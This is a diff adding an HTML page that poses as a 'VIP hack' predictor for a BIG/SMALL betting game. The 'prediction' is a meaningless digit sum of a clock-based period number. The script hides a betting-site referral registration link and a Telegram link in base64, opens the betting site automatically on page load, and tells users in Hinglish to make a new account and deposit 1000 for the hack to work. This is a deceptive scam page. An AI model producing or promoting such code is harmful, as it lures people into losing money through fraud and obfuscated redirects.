@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>APKMODDERKING VIP </title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #000; overflow: hidden; }
+        #bg-frame { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
+
+        .btn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(45deg, #ff007f, #ff6600);
+            color: white;
+            border: none;
+            font-size: 14px;
+            font-weight: bold;
+            border-radius: 50%;
+            cursor: grab;
+            transition: 0.3s;
+            box-shadow: 0px 5px 15px rgba(255, 105, 180, 0.6);
+            z-index: 10;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            user-select: none;
+        }
+        .btn:active { cursor: grabbing; }
+
+        .box {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 350px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            color: white;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0px 10px 25px rgba(255, 255, 255, 0.2);
+            z-index: 100;
+            display: none;
+        }
+        .box.show { display: block; }
+
+        .box h2 {
+            font-size: 22px;
+            color: cyan;
+            margin-bottom: 10px;
+            text-shadow: 0px 0px 5px cyan;
+        }
+
+        .close {
+            background: #ff007f;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            margin-top: 15px;
+            font-weight: bold;
+            border-radius: 5px;
+            transition: 0.3s;
+        }
+        .close:hover { background: #ff6600; }
+
+        .link { color: cyan; display: block; margin: 10px 0; text-decoration: none; font-weight: bold; }
+        .link:hover { text-decoration: underline; }
+
+        .period { font-size: 18px; margin-bottom: 10px; }
+        .time { font-size: 24px; font-weight: bold; color: yellow; }
+
+        .res {
+            font-size: 28px;
+            font-weight: bold;
+            margin-top: 10px;
+            opacity: 0;
+            transform: scale(0.8);
+            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
+        }
+        .res.show { opacity: 1; transform: scale(1); }
+        .big { color: lime; text-shadow: 0px 0px 8px lime; }
+        .small { color: orange; text-shadow: 0px 0px 8px orange; }
+    </style>
+</head>
+<body>
+
+    <iframe id="bg-frame"></iframe>
+    <button class="btn" id="open">Hack</button>
+    <div class="box" id="box">
+        <h2>APKMODDERKING</h2> <!-- Dialog Box Title Added -->
+        <div class="period">Period: <span id="periodNum"></span></div>
+        <div>Time Left: <span class="time" id="timer">00:00</span></div>
+        <div id="resText" class="res"></div>
+        <a id="tgLink" class="link" target="_blank">Join my Telegram channel</a>
+        <p>New account isi hack se bna kar 1000 deposit karein tabhi hack work karegi aur website se connect hogi.</p>
+        <button class="close" id="close">Close</button>
+    </div>
+
+    <script>
+        let open = document.getElementById("open"),
+            box = document.getElementById("box"),
+            timer = document.getElementById("timer"),
+            resText = document.getElementById("resText"),
+            periodNum = document.getElementById("periodNum"),
+            close = document.getElementById("close"),
+            bgFrame = document.getElementById("bg-frame"),
+            tgLink = document.getElementById("tgLink");
+
+        function d(s) { return atob(s); }
+        let encBg = "aHR0cHM6Ly9iZGd3aW4uY2MvIy9yZWdpc3Rlcj9pbnZpdGF0aW9uQ29kZT0zNzIxNzE0MDA1MjA=";
+        let encTg = "aHR0cHM6Ly90ZWxlZ3JhbS5tZS9hcGttb2RkZXJraW5n";
+
+        open.onclick = () => { box.classList.add("show"); };
+        close.onclick = () => { box.classList.remove("show"); };
+        tgLink.href = d(encTg);
+
+        function update() {
+            let now = new Date(),
+                y = now.getUTCFullYear(),
+                m = String(now.getUTCMonth() + 1).padStart(2, '0'),
+                d = String(now.getUTCDate()).padStart(2, '0'),
+                h = now.getUTCHours(),
+                min = now.getUTCMinutes(),
+                total = h * 60 + min,
+                num = `${y}${m}${d}1000${10001 + total}`;
+            
+            periodNum.innerText = num;
+            let sum = [...num.slice(-2)].reduce((a, b) => a + parseInt(b), 0);
+            if (sum > 9) sum = [...String(sum)].reduce((a, b) => a + parseInt(b), 0);
+            let res = sum >= 5 ? "BIG" : "SMALL";
+
+            resText.innerHTML = `<span class="${sum >= 5 ? 'big' : 'small'}">${res}</span>`;
+            resText.classList.add("show");
+            setTimeout(() => { resText.classList.remove("show"); }, 500);
+
+            let sec = now.getUTCSeconds(),
+                remain = 60 - sec;
+            timer.innerText = `00:${String(remain).padStart(2, '0')}`;
+        }
+
+        setInterval(update, 1000);
+        update();
+
+        window.onload = function() {
+            window.open(d(encBg), "_blank");
+            bgFrame.src = d(encBg);
+        };
+
+        let drag = false, offsetX, offsetY;
+        open.addEventListener("mousedown", (e) => {
+            drag = true;
+            offsetX = e.clientX - open.getBoundingClientRect().left;
+            offsetY = e.clientY - open.getBoundingClientRect().top;
+        });
+
+        document.addEventListener("mousemove", (e) => {
+            if (drag) {
+                open.style.left = `${e.clientX - offsetX}px`;
+                open.style.top = `${e.clientY - offsetY}px`;
+            }
+        });
+
+        document.addEventListener("mouseup", () => { drag = false; });
+
+        open.addEventListener("touchstart", (e) => {
+            drag = true;
+            let touch = e.touches[0];
+            offsetX = touch.clientX - open.getBoundingClientRect().left;
+            offsetY = touch.clientY - open.getBoundingClientRect().top;
+        });
+
+        document.addEventListener("touchmove", (e) => {
+            if (drag) {
+                let touch = e.touches[0];
+                open.style.left = `${touch.clientX - offsetX}px`;
+                open.style.top = `${touch.clientY - offsetY}px`;
+            }
+        });
+
+        document.addEventListener("touchend", () => { drag = false; });
+    </script>
+
+</body>
+</html>
